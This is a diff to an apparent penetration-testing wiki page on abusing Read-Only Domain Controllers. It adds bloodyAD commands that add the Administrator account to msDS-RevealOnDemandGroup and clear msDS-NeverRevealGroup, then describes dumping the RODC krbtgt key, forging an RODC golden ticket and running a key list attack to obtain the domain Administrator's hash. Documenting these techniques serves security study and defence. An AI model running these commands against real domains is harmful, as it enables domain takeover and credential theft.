@@ -28,6 +28,21 @@ From UNIX-like systems, this [PowerView python package](https://github.com/aniqf
 <strong>PV > Set-DomainObject -Identity RODC-server$ -Clear msDS-NeverRevealGroup
 </strong></code></pre>
 
+Alternatively, it can be achieved using [bloodyAD](https://github.com/CravateRouge/bloodyAD)
+
+```bash
+# Get original msDS-RevealOnDemandGroup values 
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" get object 'RODC-server$' --attr msDS-RevealOnDemandGroup
+distinguishedName: CN=RODC,CN=Computers,DC=domain,DC=local
+msDS-RevealOnDemandGroup: CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local
+
+# Add the previous value plus the admin account
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object 'RODC-server$' --attr msDS-RevealOnDemandGroup -v 'CN=Allowed RODC Password Replication Group,CN=Users,DC=domain,DC=local' -v 'CN=Administrator,CN=Users,DC=domain,DC=local'
+
+#If needed, remove the admin from the msDS-NeverRevealGroup attribute
+bloodyAD --host "$DC_IP" -d "$DOMAIN" -u "$USER" -p "$PASSWORD" set object 'RODC-server$' --attr msDS-NeverRevealGroup
+```
+
 Then, dump the `krbtgt_XXXXX` key on the RODC server with admin access on the host (this can be done by modifying the `managedBy` attribute for example), and use it to forge a [RODC golden ticket](../kerberos/forged-tickets/rodc-golden-tickets.md) and conduct a [key list attack](../credentials/dumping/kerberos-key-list.md) to retrieve the domain Administrator's password hash.
 {% endtab %}
 
@@ -44,6 +59,7 @@ Set-DomainObject -Identity RODC-Server$ -Clear 'msDS-NeverRevealGroup'
 
 Then, dump the `krbtgt_XXXXX` key on the RODC server with admin access on the host (this can be done by modifying the `managedBy` attribute for example), and use it to forge a [RODC golden ticket](../kerberos/forged-tickets/rodc-golden-tickets.md) and conduct a [key list attack](../credentials/dumping/kerberos-key-list.md) to retrieve the domain Administrator's password hash.
 {% endtab %}
+
 {% endtabs %}
 
 ## Resources
